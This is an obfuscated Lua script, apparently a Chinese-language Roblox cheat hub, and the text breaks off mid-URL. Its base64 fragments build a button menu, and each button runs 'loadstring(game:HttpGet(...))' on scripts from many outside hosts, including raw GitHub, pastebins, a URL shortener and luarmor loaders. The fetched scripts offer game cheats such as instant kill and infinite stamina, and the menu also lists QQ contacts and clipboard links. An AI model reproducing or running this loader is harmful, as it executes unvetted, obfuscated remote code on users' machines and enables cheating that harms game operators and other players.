JxNevFdpDfrIDsODLgAqhpjpPTCKDWlIyGvDkRGxmjnpGfHhWXhSVZZLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')模仿者（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lOMfjVFYejjbrBLQrSdJCEoOOCcpyROqfGJGSGXRAtnjBIpiewCFHOJTwHPwUZTjzQtnrrLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.mdtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TZCFZlQviKOejALUufLWEiSHUwlfWEVInjWwXfdaOSuWkJrPRLgxXbxPbFWkiWvIyutGYRLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rYvXUbuxGDnVHnxHMuVAxupDeiJgdnfBRPilCOUPzeyiBIvKxwIHyczcsagAeBJchJhRwlLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WtSGlCAYqfegbUmJqBPdLIzKBNznCtSyWMesplHCHNrAvcvLaefdzmXLdUPKpGWpgrxkqgamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rBbqqutZoVKAMBdXquEywQjPGRPDbPmmMsBjXfiuewTJrnWZAdbTrIlascLPgwTiWtzAflamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pgmoHvBNbLwgHejOsFuNJgGseVYCIVNabLqQZrzfHyjnNNUxzHZgtVjcPbQEjbOrSQANGsbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KscrTxOrSWwEZBfitNSUkiPxIyrWdZohRSxoOymcSZtomDqCzKIrJHybUaaAEgGXCbVBBoKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')出租车司机脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QuHZHpcDUOQgtqpTrLgThSHuyuFCPkkpXEdDESDzQpimOmSzLVcwLqMInTelxbRsBbfSizLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zuAkzvyBHljJHWAGhKGavcvwtbtwJLdVHLIgmxdqAQxHKqrfFbCIUSuFmjuRjjaNzSpIDVKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mRrYlngyvJzCmpuRFqQwnBvUxIyhdkfAVHtTonauMoguBspIEkYxIJTdunfAPUvDfpDcYjLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')自动抽蛋开启tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('peiPUxdgnPWeHBDNBSjIKjYZDiSazhqoKugrnFandhoSIFYkYDiCvveqJmSvMTXWJuKPEILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KAKSKSKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AeQKycrnCxcqyOMXqQwpSfyWxQChuvhiymTwwsFVjSoFFNlOJGdUcnltPwjARXXFuJyqtzKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')自动抽蛋关闭tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dgRFYmCTrdikQnyEukUMZbHUqyzHpXBfTYlGFRlAFlFnnPSlEFnLjdNQPyGTpvzqPfofuFLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KA28272tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AXejibxUPkcEMWMuAYtGEcGJCinDMmFCmiynJsLEdrxjtkLbstEOgPWopYFluAqBUGHRSlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')战斗勇士tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AhAfeFHAjjFxrmAcTLoRFsnjXXWoZDzzHUhJISZrrRIvVLryjjFkhHYfLxQkVWlHqAFZGULA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nNeVEpdTuPbuCttHKfOnNnyTrarQoQdZnIoExrQrAuRovShyQVaAdlOrnEBMbaMUHkOQOFKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('unHysjIZGZgLbKbXnbtbMTGdbYdgViTPxmAFZfsYsHDNrIdTaBUixvOOruPpmtlcDhoKBuLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')战斗勇士（英文电脑端，直接畅玩）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VExDRsQusjofCvUozDzfTXuUUbqVVtYwADrWXffCiEBkYpVTejnfHMUgGOJGsjPwmhffbbLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/ScripttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tZxWVvRKXGnBlMPBRZzPCJhxxToweSGFjOrDwYrIlcWcYNuQimFkGgGznihxburWWpEIbPKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')战斗勇士老外英文tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yYNRtItXcjLHqzIOryzeUUpcZrbPKmyFYKFVrxbFMTEcOKvkqPZSgCgkpwRswhMKMJizvILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://paste.gg/p/anonymous/697fc3cad5f743508318cb7399e89432/files/b5923e52edab4e5c91e46b74563d0ae8/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LbDssqjpUhWRtrmFhRKfcQXLNpmCWYvZrrkIsSWZUeydjGSxIgabOTQUEtdVNESFdzfPsnKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')战斗勇士无限体力tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WRGkEmKaOfixxswJTDkcRDuLDXOgwnjGDzPeKoNZlBXelVNZJAaEuSfPOWJvnWfOuKcsGILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KSKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zkkNeyorCWImvSChTSkWTNIxTusMWThRBazemHQNXtJZVoXpLqCFBGHyypRCpbGYTgRjubKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EhmvtsYnDGZpVixagOMwPNOWQetWqFrTfWHkXNyFEZkXrnhverZoKGOifZaWzDMllbgPRWLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hJMvoQsvxVfBgrGeIYSuaUbxKtbKxbqSoYACTBXNbsjCmPqXRoZtLSfslEnczEuKeMuWzeamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KePQksjjavUTHknQaqNECdIkFDGLnWDgZAjucRTgkpdpalPKrBTDEaDMxqQSPpnJWxrnBzamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iBqJUwLspPeFjSYhbwjUKKHEBhJpMXutjNSmqhOpKQPkrWUbYXaNPQGbdpyCDdCewBJEzpbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GBQjeCExPotyaWJtjooemZpPZhUjIiLqHEoXneARxqhKNfcMzwiXlfxRLrLRFmwdJeVxANKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')piggy脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FihENedfHmbnvyuPpKihVTQWtDewZPWdWxvjqFJyNTIHWgShILbdOwJnTsiLuOmRMtkxWYLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XahlXJTPUvaYqINPPMXBkyFEGMnVfQrgTwTZtJEDPIElVOCGrCskSrRGUbNMYIvQnCcsquKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')piggy脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ecrmxFqPwqwkuLyQuzSyosbDUUmGermLxcpepnPJEVOMLZTjKZjKzmLgosirfvRTpViZuTLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')piggy脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RcIkpmjLNaNxhPWJvteGhClHYbAYbEDjuYfzgVOTGLFUQOAhBmpmvYowLgQSrPYkbnHZLCLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Piggy/Loader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aqInlmAIKVZbcNKOAJqxSkOrkqYFVrOJbXByynfRDxWZQEtJdbsSTnUEkwMqOkGwzYXjZFKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')piggy英文tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qRJAhboMpRzdeNVaVYAnLIxQObhVUmgKNaFWVmKlmkZcwCdpHaVdkwKmBugDVNlrWweBeiLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://encurtador.com.br/fiyFJtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XouKstdxkJHTNYJLmTjsUfCTuuUQPYZpZzDeLfdZJazgCmyKkcZDUKFEKcuesweKamzGHuKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')SharkBite 2[TRADING]脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('smvLHeeUXOIAtPgjYNUSfKidnUVkmtGOEFLoTCDtzhhQSdhsxbtarqBqCMUUfEyMWFIuZzLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JCUTiaRExUKMPRrMHZPTEGWGYrcerjPgYXgWKDkHNtNQIeNfqxUnoQoWwvcUDMvBLcVHjJKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VInafyNNVGvwBlhzUeTMtDtuEvZSpqxPCbyFYgChrqDvJfxAlRObhyTwFUIlSraeZSutGILHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')SharkBite 2[TRADING]tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qRqOtTJRmBcijSPYEGDUDhQvHbdfabcoXSqcUThUgHKEXySlQjDMbJVVjGDZAulrOGFuynLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/JerrymiahPM/SharkRipper/main/main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lOnFZPzseGVanGKcOCZdYvKPLIrkfUuguVFWfMWkSFhFfbmDjIDJrtpKBKHVVfqaBJcxfwKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')SharkBite 2[TRADING]tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oBJLfPSmQctZjlBQpEreJZzBDPvngiwRcWSGlswgVbDWnwKAqhuaiMmhhMhyETjFlpkKPWLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/PikachuHack/SharkBite2-Instant-Kill-Main-Shark/main/Instant%20Kill%20Main%20SharktZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TemRyLBgGwKqmHVsDuaQobeElFDoGTPtLravzdujKPrPYhgalcwuEkYaMoApdAqBUyWmWqKSkoKQ0KZW5kKQ0KbG9jYWwgY3JlZGl0cyA9IGNyZWRzOnNlY3Rpb24o')『卡密模式』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HsZkuoZFwyNBPhczWNqhoobvDpXQWtBIwQRyWZxUKxbqtdqkGvFShCLqRdSnTlruwkjhtdLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')SharkBite 2[TRADING]tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mdtDXgGFyFOxzdizUVJlohYxnNtAqXqVpCNfVZGjPXhfGXGDozNEGXHhINBRcocuFPsIFxLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://api.luarmor.net/files/v3/loaders/62ac508ae22ac9d4d5485af7a4531b0b.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EkyoziBAMcqGzQBRnnPurYVLhtLlgXeoKrqcKbUldToOSJHbORHJahukwnabKzrqcREwAIKSkoKSANCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')点击我复制密钥链接tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QZUhuRhHwKyXoEPNvNzWCVOXlMyUDaxSXzRDHyOQRPhReCivYLSWepSYZSTudlDKgWMdtLLGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://keyrblx.com/getkey/StellarHubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AxBlrLebjveXxmXFZqoCQnNPwXctbSubxHEzDWTDFwOEVQchSAHUhMHurSnuTglewAvgysKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')SharkBite 2[TRADING]tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QkSCLFAASmRQSiOhkLLmGEfQTzbxJftGNQFVhzWjBZnqHerqwyJpuCHiPQOnCcHCxdiUjiLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/FlmesCoding/CandyHubGames/main/Protected_1799613766569471.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KXWzFUWuBpCtVHHFyCiZCyyQghjopZxXHvoVmFocMxsmzjkwnOPfhwfgpyDJFLOAsklxZvKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')点击复制dctZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VVDOXZTYTZobSxEVwloYiTCFLQqItJTnApDknwCyZTZaxzjvYedjKUgHbtuupOQACDEmipLGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://discord.gg/NZU9zq5gMutZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hwdvzuzYbuHotBNLfiMXUToQSpGhmbTJLUpSVCPYSmMvNLvvUwjuLCXBopinmYQzlgTDlXKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')SharkBite 2[TRADING]tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TTadZXaumwspfsFGWXZYbuVgHhIoTFkevfxYmFhthwxvkioheyJBYiFxIZWIEwGDmslVDCLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/IsThisMe01/Project-L/main/Main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kuyTXjagcnJxpxFNFdeTWBHCENnEApfInTJynBpyyPMEeVGuFpOSMOaPJrvwMFJlkiJqeqKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')点击我复制dctZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('liongSaIJFVSObqsbtWvRFZvXeZgDHcjfRBpKiCruywliGOLJlesedZdSHUiCPirDWcYfyLGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://discord.gg/FWhdk92nYjtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fZywVXHfpdDKdwvYOHXYngIWaIduIaioalJTEXDpSYNANFfXYvZNJstJcBcPuThbUHEYeYKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')火箭发射模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wUfstFKmMXNogvGajaHvyNmTpKYZgGsNavPGUvmeDfxlYUzrBkKYAFCAwdiJExoOPcDVOJLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TTJtgikwZsvLOsQYCThcoCEzWHnLuyhECWirZjExyMalKTdkLKIZcbbPlrxWouxoqNEYhuKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TpFzGUapgZatmtQEshkzoXAxWmLsbHcyYeVNPYmCAnhpXkJLLnswhNGxujgaSGoYzwhJKVLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')火箭发射模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FZrzApBcbfjOazBPuALozztXfHazZbKHeNCJjhHMQUBCmDiaHEUNNENPpeZKuAUanupGVLLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://ayangwp.cn/api/v3/file/get/9245/%E7%8C%AB%E9%80%9A%E7%94%A8.txt?sign=hrWROZdVfK2mtJcIFa3Tvbl-TojP1C86_Zd3q03qttc%3D%3A0tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mbaeeEIiEcDSjHfvtulMjZsDMaeHSSTNuQUJQLzDwKelsWCGYrDYUpYdfXkjEhhmDqlLaQKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')火箭发射模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('whkfXjzomnsbXoBbylytQyQwBHijLYWVNgjSrDfBLtAInbMLEDuIczCJKFzwusbthcREUtLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/321_blast_off_simulatortZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PNkSDtIdHUIZOlHZqGTilOeTjjeGDVjuYaohjvejHkpigPCpIhQvIzkqFBeyGkPrRfmhtlKSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DpZqVrOoOJBOcUprGuCQBGPSqCvygMNjSjoDFXFrxWpabtqJcHAOoVVvvLsoVSRqhlXDwRLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ntgBGWwMQmkkAdYIejXHWJOsUzcCLiowVtFOAGfOfonjjEMstcdWXDNoHqfmmskVgrnkufamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TFsLXdBNkYvpznkEhbwZGGkcBwpAtCNpxCxyjadsFMGzkgdWuKyHxVqZzMotPQMJdhZLYXamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MZTFaQzzziDxCCooaZitbFukDKoObHcLozvkKNNUtDCcUxLoTdDAKvLkGqSMhYQambyLywbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dqfSJkCJFMfPpUWFemUVJWjzPBiuipsJpWrkKxFwzhCiIyaXNxUlWumIfkcqBTXqDOdWNkKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')只因剑tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hBLzpNWKXGeeZgVhqgMRVdMwDJSpmXFhFDXsHvrbfXWgYUcymDuRgZsQlnLxTKMPkcvIUcLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XLYKtzaIVGnMAheqTuxXJLasVZgYTQIhCLSpVoZUPUBeTtmvUkvieDepiBXOZwRWVtQoabKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XYqvLOOpaKxnYTehRoYmvFMBQtyqwPwfprfbrJHZwsoTmdngAilZZbnPDusmLcIogcCwTILHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')只因剑（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GhsaCWqrkvbWFdWacLxotChWvAabtmovqrllMKvllYfTeLEjzDggQaOXWBQpeclMJjWHhcLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('juyhahAncICbcIBEIbxWwbOTncUMcOSwKSintwrnVuyqwKYmhiRZyqhmkNUNwensBaEFosKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')只因剑（2召唤小黑子）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WVZmsLgCNuoCZubWMyCCNrhRwArkamgpWEjzbdwbILWWimEQIZVmSiiZxYCJggzVeyvfwCLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordW